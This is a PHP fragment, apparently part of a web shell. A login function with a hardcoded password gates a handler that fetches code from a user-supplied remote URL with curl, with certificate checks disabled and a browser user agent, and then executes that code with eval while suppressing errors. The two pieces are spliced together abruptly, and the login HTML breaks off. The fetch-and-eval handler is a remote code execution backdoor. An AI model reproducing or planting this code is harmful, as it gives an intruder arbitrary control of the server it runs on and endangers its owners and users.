function requireLogin() {
    global $LOGIN_USERNAME, $LOGIN_PASSWORD;

    if (isset($_POST['login_user']) && isset($_POST['login_pass'])) {
        $u = $_POST['login_user'];
        $p = $_POST['login_pass'];
        if ($u === $LOGIN_USERNAME && $p === $LOGIN_PASSWORD) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
    }

    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        ?>
        <!DOCTYPE html>

if (!empty($_POST['remote_url'])) {
    echo "<div class='result-box'>";

    $ch = curl_init($_POST['remote_url']);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    
    $code = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    
    if ($err || empty($code)) {
        echo "<pre style='color:red;'>❌ ERROR: $err</pre>";
    } else {
        // **SESSION CONFLICT FIX - NO session_write_close()**
        $code = preg_replace('/<\?php\s+session_start\s*\(\s*\)\s*;?/i', '<?php ', $code);
        $code = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '', $code);
        
        echo "<details><summary>Code Preview (" . strlen($code) . " bytes)</summary>";
        echo "<pre style='font-size:11px;max-height:200px;overflow:auto;'>" . htmlspecialchars(substr($code, 0, 4000)) . "</pre>";
        echo "</details>";
        
        ob_start();
        @eval('?>' . $code);  // **NO SESSION CLOSE - SAFE**
        $output = ob_get_clean();
